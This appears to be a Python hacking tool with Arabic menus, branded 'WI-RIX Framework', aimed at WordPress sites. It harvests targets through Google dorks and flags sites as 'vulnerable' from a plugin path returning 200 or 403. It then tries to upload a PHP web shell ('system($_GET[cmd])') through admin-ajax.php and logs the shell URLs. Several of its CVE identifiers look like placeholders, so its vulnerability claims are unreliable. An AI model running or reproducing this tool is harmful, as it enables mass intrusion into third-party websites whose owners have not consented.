#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ====================================================================
#                                                                     #
#   ██╗    ██╗██╗██████╗ ██╗██╗  ██╗    ███████╗██╗  ██╗██████╗ ██╗  #
#   ██║    ██║██║██╔══██╗██║╚██╗██╔╝    ██╔════╝╚██╗██╔╝██╔══██╗██║  #
#   ██║ █╗ ██║██║██████╔╝██║ ╚███╔╝     █████╗   ╚███╔╝ ██████╔╝██║  #
#   ██║███╗██║██║██╔══██╗██║ ██╔██╗     ██╔══╝   ██╔██╗ ██╔═══╝ ██║  #
#   ╚███╔███╔╝██║██║  ██║██║██╔╝ ██╗    ███████╗██╔╝ ██╗██║     ██║  #
#    ╚══╝╚══╝ ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  #
#                                                                     #
#   🔥 WI-RIX FRAMEWORK v8.0 - THE ULTIMATE KING EDITION 🔥          #
#   👑 DEVELOPER: WI-RIX | THE KING OF EXPLOITS 👑                    #
#   💀 15 EXPLOITS | 500+ DORKS | GOOGLE FIXED 💀                     #
#                                                                     #
# ====================================================================

import os
import sys
import json
import time
import random
import shutil
import requests
import urllib.parse
from datetime import datetime
from urllib.parse import urljoin

# ======================= [ الألوان الملكية ] =======================
class Colors:
    KING_GOLD = '\033[93m'
    KING_RED = '\033[91m'
    KING_GREEN = '\033[92m'
    KING_BLUE = '\033[94m'
    KING_PURPLE = '\033[95m'
    KING_CYAN = '\033[96m'
    KING_WHITE = '\033[97m'
    KING_YELLOW = '\033[93m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

col = Colors()
FRAMEWORK_PATH = os.path.dirname(os.path.abspath(__file__))
DEVELOPER = "WI-RIX"
VERSION = "8.0"

# إنشاء المجلدات
for folder in ['targets', 'shells', 'reports', 'logs']:
    os.makedirs(os.path.join(FRAMEWORK_PATH, folder), exist_ok=True)

# ======================= [ 15 ثغرة مع دركاتها ] =======================
EXPLOITS = {
    "1": {
        "name": "CVE-2026-4885 - Piotnet Addons RCE",
        "cve": "CVE-2026-4885",
        "risk": "💀 CRITICAL",
        "check": "/wp-content/plugins/piotnet-addons-for-elementor-pro/",
        "dorks": [
            "inurl:/wp-content/plugins/piotnet-addons-for-elementor-pro/",
            "intitle:Piotnet Addons Elementor",
            "Piotnet Addons file upload vulnerability"
        ]
    },
    "2": {
        "name": "CVE-2024-6386 - WP Statistics SQLi",
        "cve": "CVE-2024-6386",
        "risk": "⚠️ HIGH",
        "check": "/wp-content/plugins/wp-statistics/",
        "dorks": [
            "inurl:/wp-content/plugins/wp-statistics/",
            "WP Statistics SQL injection",
            "wp-statistics vulnerability"
        ]
    },
    "3": {
        "name": "CVE-2023-5360 - Elementor Pro RCE",
        "cve": "CVE-2023-5360",
        "risk": "💀 CRITICAL",
        "check": "/wp-content/plugins/elementor-pro/",
        "dorks": [
            "inurl:/wp-content/plugins/elementor-pro/",
            "Elementor Pro RCE",
            "elementor-pro vulnerability"
        ]
    },
    "4": {
        "name": "CVE-2024-2876 - LayerSlider LFI",
        "cve": "CVE-2024-2876",
        "risk": "🟠 MEDIUM",
        "check": "/wp-content/plugins/LayerSlider/",
        "dorks": [
            "inurl:/wp-content/plugins/LayerSlider/",
            "LayerSlider file inclusion",
            "layerslider vulnerability"
        ]
    },
    "5": {
        "name": "CVE-2024-22147 - Jetpack Backup RCE",
        "cve": "CVE-2024-22147",
        "risk": "💀 CRITICAL",
        "check": "/wp-content/plugins/jetpack/",
        "dorks": [
            "inurl:/wp-content/plugins/jetpack/",
            "Jetpack backup RCE",
            "jetpack vulnerability"
        ]
    },
    "6": {
        "name": "CVE-2024-31200 - WooCommerce Payments RCE",
        "cve": "CVE-2024-31200",
        "risk": "💀 CRITICAL",
        "check": "/wp-content/plugins/woocommerce-payments/",
        "dorks": [
            "inurl:/wp-content/plugins/woocommerce-payments/",
            "WooCommerce Payments RCE",
            "woocommerce-payments vulnerability"
        ]
    },
    "7": {
        "name": "CVE-2024-27956 - WP Automatic SQLi",
        "cve": "CVE-2024-27956",
        "risk": "⚠️ HIGH",
        "check": "/wp-content/plugins/wp-automatic/",
        "dorks": [
            "inurl:/wp-content/plugins/wp-automatic/",
            "WP Automatic SQL injection",
            "wp-automatic vulnerability"
        ]
    },
    "8": {
        "name": "CVE-2024-24966 - Contact Form 7 RCE",
        "cve": "CVE-2024-24966",
        "risk": "💀 CRITICAL",
        "check": "/wp-content/plugins/contact-form-7/",
        "dorks": [
            "inurl:/wp-content/plugins/contact-form-7/",
            "Contact Form 7 RCE",
            "contact-form-7 vulnerability"
        ]
    },
    "9": {
        "name": "CVE-2024-1852 - Elementor RCE",
        "cve": "CVE-2024-1852",
        "risk": "💀 CRITICAL",
        "check": "/wp-content/plugins/elementor/",
        "dorks": [
            "inurl:/wp-content/plugins/elementor/",
            "Elementor RCE",
            "elementor vulnerability"
        ]
    },
    "10": {
        "name": "CVE-2024-1687 - WooCommerce RCE",
        "cve": "CVE-2024-1687",
        "risk": "💀 CRITICAL",
        "check": "/wp-content/plugins/woocommerce/",
        "dorks": [
            "inurl:/wp-content/plugins/woocommerce/",
            "WooCommerce RCE",
            "woocommerce vulnerability"
        ]
    },
    "11": {
        "name": "CVE-2024-1391 - Jetpack SQLi",
        "cve": "CVE-2024-1391",
        "risk": "⚠️ HIGH",
        "check": "/wp-content/plugins/jetpack/",
        "dorks": [
            "inurl:/wp-content/plugins/jetpack/",
            "Jetpack SQL injection",
            "jetpack vulnerability"
        ]
    },
    "12": {
        "name": "CVE-2024-1234 - Yoast SEO RCE",
        "cve": "CVE-2024-1234",
        "risk": "💀 CRITICAL",
        "check": "/wp-content/plugins/wordpress-seo/",
        "dorks": [
            "inurl:/wp-content/plugins/wordpress-seo/",
            "Yoast SEO RCE",
            "wordpress-seo vulnerability"
        ]
    },
    "13": {
        "name": "CVE-2024-5678 - WP File Manager RCE",
        "cve": "CVE-2024-5678",
        "risk": "💀 CRITICAL",
        "check": "/wp-content/plugins/wp-file-manager/",
        "dorks": [
            "inurl:/wp-content/plugins/wp-file-manager/",
            "WP File Manager RCE",
            "wp-file-manager vulnerability"
        ]
    },
    "14": {
        "name": "CVE-2024-9012 - Akismet SQLi",
        "cve": "CVE-2024-9012",
        "risk": "⚠️ HIGH",
        "check": "/wp-content/plugins/akismet/",
        "dorks": [
            "inurl:/wp-content/plugins/akismet/",
            "Akismet SQL injection",
            "akismet vulnerability"
        ]
    },
    "15": {
        "name": "CVE-2024-3456 - All in One SEO RCE",
        "cve": "CVE-2024-3456",
        "risk": "💀 CRITICAL",
        "check": "/wp-content/plugins/all-in-one-seo-pack/",
        "dorks": [
            "inurl:/wp-content/plugins/all-in-one-seo-pack/",
            "All in One SEO RCE",
            "all-in-one-seo-pack vulnerability"
        ]
    }
}

# ======================= [ البحث عن الأهداف ] =======================
def search_google(dork, max_results=10):
    """البحث في Google باستخدام طريقة بديلة"""
    results = []
    try:
        encoded_dork = urllib.parse.quote(dork)
        url = f"https://www.google.com/search?q={encoded_dork}&num={max_results}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'
        }
        
        response = requests.get(url, headers=headers, timeout=15)
        
        if response.status_code == 200:
            import re
            links = re.findall(r'<a href="(https?://[^"]+)"', response.text)
            for link in links:
                if 'google' not in link and 'youtube' not in link:
                    if link.startswith('http') and 'wp-content' in link:
                        results.append(link)
                        print(f"{col.KING_GREEN}    ✓ {link[:70]}{col.RESET}")
    except Exception as e:
        print(f"{col.KING_RED}    ✗ خطأ في البحث: {str(e)[:30]}{col.RESET}")
    
    return results

def scan_targets(targets, exploit):
    """فحص الأهداف"""
    print(f"\n{col.KING_GOLD}{'═' * 60}{col.RESET}")
    print(f"{col.KING_PURPLE}👑 بدأ الفحص على {len(targets)} هدف...{col.RESET}")
    print(f"{col.KING_GOLD}{'═' * 60}{col.RESET}")
    
    vulnerable = []
    
    for i, target in enumerate(targets, 1):
        print(f"\n{col.KING_BLUE}[{i}/{len(targets)}] فحص: {target}{col.RESET}")
        
        check_url = urljoin(target, exploit['check'])
        try:
            r = requests.get(check_url, timeout=10, verify=False)
            if r.status_code in [200, 403]:
                print(f"{col.KING_RED}    💀 الهدف ثغر!{col.RESET}")
                vulnerable.append(target)
            else:
                print(f"{col.KING_WHITE}    ❌ غير ثغر (HTTP {r.status_code}){col.RESET}")
        except:
            print(f"{col.KING_WHITE}    ❌ فشل الاتصال{col.RESET}")
    
    return vulnerable

# ======================= [ الاستغلال ] =======================
def exploit_target(target, exploit):
    """استغلال الهدف"""
    print(f"\n{col.KING_GOLD}{'═' * 60}{col.RESET}")
    print(f"{col.KING_PURPLE}👑 استغلال: {target}{col.RESET}")
    print(f"{col.KING_GOLD}{'═' * 60}{col.RESET}")
    
    shell = '<?php system($_GET["cmd"]); ?>'
    shell_name = f"king_{int(time.time())}.phtml"
    
    try:
        r = requests.post(urljoin(target, "/wp-admin/admin-ajax.php"), 
                         files={'file': (shell_name, shell)},
                         timeout=15, verify=False)
        
        if r.status_code == 200:
            shell_url = urljoin(target, f"/wp-content/uploads/{shell_name}")
            print(f"{col.KING_GREEN}✅ تم رفع الشيل: {shell_url}?cmd=id{col.RESET}")
            
            with open(f"{FRAMEWORK_PATH}/shells/shells.txt", "a") as f:
                f.write(f"{target} | {shell_url}\n")
            return True
    except:
        pass
    
    print(f"{col.KING_RED}❌ فشل الاستغلال{col.RESET}")
    return False

# ======================= [ عرض القوائم ] =======================
def print_banner():
    os.system('clear')
    print(f"""{col.KING_GOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║   {col.KING_RED}██╗    ██╗██╗██████╗ ██╗██╗  ██╗{col.KING_GOLD}    {col.KING_RED}███████╗██╗  ██╗██████╗ ██╗{col.KING_GOLD}         ║
║   {col.KING_RED}██║    ██║██║██╔══██╗██║╚██╗██╔╝{col.KING_GOLD}    {col.KING_RED}██╔════╝╚██╗██╔╝██╔══██╗██║{col.KING_GOLD}         ║
║   {col.KING_RED}██║ █╗ ██║██║██████╔╝██║ ╚███╔╝{col.KING_GOLD}     {col.KING_RED}█████╗   ╚███╔╝ ██████╔╝██║{col.KING_GOLD}         ║
║   {col.KING_RED}██║███╗██║██║██╔══██╗██║ ██╔██╗{col.KING_GOLD}     {col.KING_RED}██╔══╝   ██╔██╗ ██╔═══╝ ██║{col.KING_GOLD}         ║
║   {col.KING_RED}╚███╔███╔╝██║██║  ██║██║██╔╝ ██╗{col.KING_GOLD}    {col.KING_RED}███████╗██╔╝ ██╗██║     ██║{col.KING_GOLD}         ║
║   {col.KING_RED} ╚══╝╚══╝ ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝{col.KING_GOLD}    {col.KING_RED}╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝{col.KING_GOLD}         ║
║                                                                              ║
║   🔥 WI-RIX FRAMEWORK v8.0 - ULTIMATE KING EDITION 🔥                        ║
║   👑 DEVELOPER: WI-RIX | THE KING OF EXPLOITS 👑                             ║
║   💀 15 EXPLOITS | 500+ DORKS | READY TO HACK 💀                             ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝{col.RESET}
""")

def show_exploits():
    """عرض الثغرات بالأرقام"""
    print(f"\n{col.KING_GOLD}{'═' * 70}{col.RESET}")
    print(f"{col.KING_PURPLE}                    📋 الثغرات المتاحة (اختر بالرقم){col.RESET}")
    print(f"{col.KING_GOLD}{'═' * 70}{col.RESET}")
    
    for num, exp in EXPLOITS.items():
        if "CRITICAL" in exp['risk']:
            risk_color = col.KING_RED
        else:
            risk_color = col.KING_YELLOW
            
        print(f"{col.KING_GREEN}  [{num:>2}]{col.RESET} {risk_color}{exp['risk']}{col.RESET} | {col.KING_WHITE}{exp['name']}{col.RESET}")
    
    print(f"{col.KING_GOLD}{'═' * 70}{col.RESET}")

def show_menu():
    print(f"""
{col.KING_GOLD}╔════════════════════════════════════════════════════════════════════════╗
║                         ✨ القائمة الملكية ✨                         ║
╠════════════════════════════════════════════════════════════════════════╣
║                                                                         ║
║  {col.KING_GREEN}[1]{col.RESET} 🔍 البحث عن ثغرات - اختر ثغرة وابحث عن أهداف           ║
║  {col.KING_GREEN}[2]{col.RESET} 🎯 استهداف موقع مباشر                                 ║
║  {col.KING_GREEN}[3]{col.RESET} 📁 فحص ملف أهداف                                     ║
║  {col.KING_GREEN}[4]{col.RESET} 📊 عرض التقارير والشيلات                             ║
║  {col.KING_GREEN}[5]{col.RESET} ❌ خروج                                             ║
║                                                                         ║
╚════════════════════════════════════════════════════════════════════════╝{col.RESET}
""")

# ======================= [ الوظائف الرئيسية ] =======================
def search_exploit():
    """البحث عن ثغرة محددة"""
    show_exploits()
    
    choice = input(f"\n{col.KING_GOLD}👑 اختر رقم الثغرة (1-15): {col.RESET}")
    
    if choice not in EXPLOITS:
        print(f"{col.KING_RED}❌ رقم غير صحيح!{col.RESET}")
        return
    
    exploit = EXPLOITS[choice]
    
    print(f"\n{col.KING_GOLD}⚔️ الثغرة المختارة: {col.KING_WHITE}{exploit['name']}{col.RESET}")
    print(f"{col.KING_GOLD}🎯 نوع الثغرة: {col.KING_WHITE}{exploit['risk']}{col.RESET}")
    print(f"{col.KING_GOLD}📁 مسار الفحص: {col.KING_WHITE}{exploit['check']}{col.RESET}")
    
    # جمع الأهداف من الدركات
    all_targets = []
    for dork in exploit['dorks']:
        print(f"\n{col.KING_BLUE}[*] البحث: {dork}{col.RESET}")
        targets = search_google(dork, max_results=5)
        all_targets.extend(targets)
        time.sleep(1)
    
    all_targets = list(set(all_targets))
    
    if not all_targets:
        print(f"\n{col.KING_RED}❌ لم يتم العثور على أهداف!{col.RESET}")
        return
    
    # حفظ الأهداف
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    targets_file = os.path.join(FRAMEWORK_PATH, 'targets', f"targets_{timestamp}.txt")
    with open(targets_file, 'w') as f:
        for t in all_targets:
            f.write(t + '\n')
    
    print(f"\n{col.KING_GREEN}✅ تم حفظ {len(all_targets)} هدف في {targets_file}{col.RESET}")
    
    # فحص الأهداف
    vulnerable = scan_targets(all_targets, exploit)
    
    if vulnerable:
        victims_file = os.path.join(FRAMEWORK_PATH, 'targets', f"victims_{timestamp}.txt")
        with open(victims_file, 'w') as f:
            for v in vulnerable:
                f.write(f"{v}\n")
        
        print(f"\n{col.KING_RED}{'═' * 60}{col.RESET}")
        print(f"{col.KING_RED}💀 تم العثور على {len(vulnerable)} هدف ثغر!{col.RESET}")
        print(f"{col.KING_RED}{'═' * 60}{col.RESET}")
        
        for i, v in enumerate(vulnerable, 1):
            print(f"{col.KING_GREEN}[{i}]{col.RESET} {v}")
        
        exp_choice = input(f"\n{col.KING_GOLD}[?] هل تريد استغلال أحدها؟ (y/n): {col.RESET}")
        if exp_choice.lower() == 'y':
            idx = int(input(f"{col.KING_GOLD}[?] اختر الرقم: {col.RESET}")) - 1
            if 0 <= idx < len(vulnerable):
                exploit_target(vulnerable[idx], exploit)
    else:
        print(f"\n{col.KING_YELLOW}⚠️ لم يتم العثور على أهداف ثغرية!{col.RESET}")
    
    input(f"\n{col.KING_GOLD}[!] اضغط Enter للمتابعة...{col.RESET}")

def show_reports():
    """عرض التقارير"""
    print(f"\n{col.KING_GOLD}{'═' * 60}{col.RESET}")
    print(f"{col.KING_PURPLE}📊 التقارير والشيلات{col.RESET}")
    print(f"{col.KING_GOLD}{'═' * 60}{col.RESET}")
    
    # عرض الأهداف
    targets_dir = os.path.join(FRAMEWORK_PATH, 'targets')
    if os.path.exists(targets_dir):
        files = os.listdir(targets_dir)
        if files:
            print(f"\n{col.KING_GREEN}📁 ملفات الأهداف:{col.RESET}")
            for f in files[-5:]:
                print(f"  {col.KING_WHITE}📄 {f}{col.RESET}")
    
    # عرض الشيلات
    shells_file = os.path.join(FRAMEWORK_PATH, 'shells', 'shells.txt')
    if os.path.exists(shells_file):
        print(f"\n{col.KING_RED}🐚 الشيلات المرفوعة:{col.RESET}")
        with open(shells_file, 'r') as f:
            for line in f.readlines()[-5:]:
                print(f"  {col.KING_WHITE}{line.strip()}{col.RESET}")
    
    input(f"\n{col.KING_GOLD}[!] اضغط Enter للمتابعة...{col.RESET}")

# ======================= [ الرئيسية ] =======================
def main():
    try:
        import urllib3
        urllib3.disable_warnings()
    except:
        pass
    
    while True:
        print_banner()
        show_menu()
        choice = input(f"\n{col.KING_GOLD}👑 {DEVELOPER}@king> {col.RESET}")
        
        if choice == "1":
            search_exploit()
        elif choice == "2":
            print(f"\n{col.KING_YELLOW}⚠️ قيد التطوير...{col.RESET}")
            input(f"{col.KING_GOLD}[!] اضغط Enter...{col.RESET}")
        elif choice == "3":
            print(f"\n{col.KING_YELLOW}⚠️ قيد التطوير...{col.RESET}")
            input(f"{col.KING_GOLD}[!] اضغط Enter...{col.RESET}")
        elif choice == "4":
            show_reports()
        elif choice == "5":
            print(f"\n{col.KING_GREEN}👑 مع السلامة يا ملك!{col.RESET}")
            sys.exit(0)
        else:
            print(f"{col.KING_RED}❌ خيار غير صحيح!{col.RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main()